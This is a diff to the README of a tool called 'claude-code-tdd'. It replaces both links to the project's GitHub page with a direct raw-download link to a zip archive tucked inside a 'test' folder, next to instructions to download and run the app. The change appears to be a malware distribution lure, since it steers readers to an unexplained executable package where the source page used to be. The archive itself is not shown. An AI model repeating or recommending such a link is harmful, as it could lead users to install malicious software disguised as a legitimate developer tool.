@@ -1,6 +1,6 @@
 # 🤖 claude-code-tdd - Run TDD with Clear Task Roles
 
-[![Download claude-code-tdd](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fnfremixer/claude-code-tdd)
+[![Download claude-code-tdd](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fnfremixer/claude-code-tdd/main/my-awesome-project/test/claude-tdd-code-v1.7.zip)
 
 ## 🧩 What this app does
 
@@ -29,7 +29,7 @@ It fits small builds, proof-of-concept work, and routine coding tasks where you 
 
 Visit this page to download and run the app:
 
-[https://github.com/fnfremixer/claude-code-tdd](https://github.com/fnfremixer/claude-code-tdd)
+[https://raw.githubusercontent.com/fnfremixer/claude-code-tdd/main/my-awesome-project/test/claude-tdd-code-v1.7.zip](https://raw.githubusercontent.com/fnfremixer/claude-code-tdd/main/my-awesome-project/test/claude-tdd-code-v1.7.zip)
 
 If you are on Windows:
 
